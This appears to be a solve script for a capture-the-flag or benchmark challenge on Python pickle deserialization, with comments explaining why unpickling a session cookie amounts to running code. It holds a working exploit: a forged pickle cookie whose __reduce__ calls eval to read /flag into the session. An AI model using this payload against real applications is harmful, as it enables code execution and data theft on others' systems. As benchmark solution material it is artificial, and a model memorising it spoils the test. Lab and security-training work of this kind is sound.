#!/usr/bin/env bash
# APEX-012-25 — "Python Pickle Deserialization RCE" (tags: insecure_deserialization)
#
# The session cookie is `base64(pickle(dict))` and the application unpickles it
# on every request. Unpickling is not parsing: a pickle stream can name a
# callable and its arguments, and `pickle.loads` will call it. So the cookie is
# a program, and the object it evaluates to becomes the session.
#
# The payload evaluates to a dictionary rather than to a shell, because the way
# out is `/api/session`, which prints `username` from whatever the session
# turned out to be. Reading `/flag` into that field is the whole exploit.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex012-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

COOKIE="$(python3 - <<'PY'
import base64, pickle

class Session:
    # (callable, args): what `pickle.loads` will call, and with what.
    def __reduce__(self):
        return (eval, ("{'authenticated':True,"
                       "'username':open('/flag').read().strip(),"
                       "'role':'pwned'}",))

print(base64.b64encode(pickle.dumps(Session())).decode())
PY
)"

"$H5I" browser open "$URL/api/session" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create --set "cookie.session=$COOKIE" | flag
